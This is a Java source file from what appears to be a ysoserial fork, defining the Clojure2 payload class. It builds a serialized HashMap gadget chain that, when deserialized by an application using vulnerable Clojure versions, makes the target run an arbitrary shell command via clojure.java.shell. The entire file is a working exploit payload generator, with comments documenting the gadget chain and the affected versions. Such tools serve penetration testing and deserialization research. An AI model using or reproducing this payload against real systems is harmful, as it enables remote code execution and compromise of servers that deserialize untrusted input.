package ysoserial.payloads;

import java.util.Arrays;
import java.util.Map;

import clojure.lang.Iterate;
import ysoserial.Strings;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.DynamicCommands;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.ObjectPayload;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			HashMap.readObject()
				clojure.lang.ASeq.hashCode()
					clojure.lang.Iterate.first() -> null
					clojure.lang.Iterate.next()  -> new Iterate(f, null, UNREALIZED_SEED)
					clojure.lang.Iterate.first() -> this.f.invoke(null)
						clojure.core$constantly$fn__4614.invoke()
						clojure.main$eval_opt.invoke()

	Requires:
		org.clojure:clojure
		Versions since 1.8.0 are vulnerable; for earlier versions see Clojure.java.
		  Versions up to 1.10.0-alpha4 are known to be vulnerable.
 */
@Dependencies({"org.clojure:clojure:1.8.0"})
@Authors({ Authors.JACKOFMOSTTRADES })
@DynamicCommands({DynamicCommands.EXEC_GLOBAL})
public class Clojure2 extends PayloadRunner implements ObjectPayload<Map<?, ?>> {

	public Map<?, ?> getObject(final String command, final String attackType) throws Exception {
		
		if(!attackType.equals("exec_global")) {
	    	
	    	System.out.println("**********************************");
	    	System.out.println(attackType + " not supported. Defaulting to ysoserial default");
	    	System.out.println("**********************************");
	    	System.out.println();
	    	
	    }
		
        String cmd = Strings.join(Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\").split(" ")), " ", "\"", "\"");

        final String clojurePayload =
            String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", cmd);

        Iterate model = Reflections.createWithoutConstructor(Iterate.class);
		Object evilFn =
				new clojure.core$comp().invoke(
						new clojure.main$eval_opt(),
						new clojure.core$constantly().invoke(clojurePayload));

		// Wrap the evil function with a composition that invokes the payload, then throws an exception. Otherwise Iterable()
        // ends up triggering the payload in an infinite loop as it tries to compute the hashCode.
        evilFn = new clojure.core$comp().invoke(
            new clojure.main$eval_opt(),
            new clojure.core$constantly().invoke("(throw (Exception. \"Some text\"))"),
            evilFn);

        Reflections.setFieldValue(model, "f", evilFn);
        return Gadgets.makeMap(model, null);
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Clojure2.class, args);
	}

}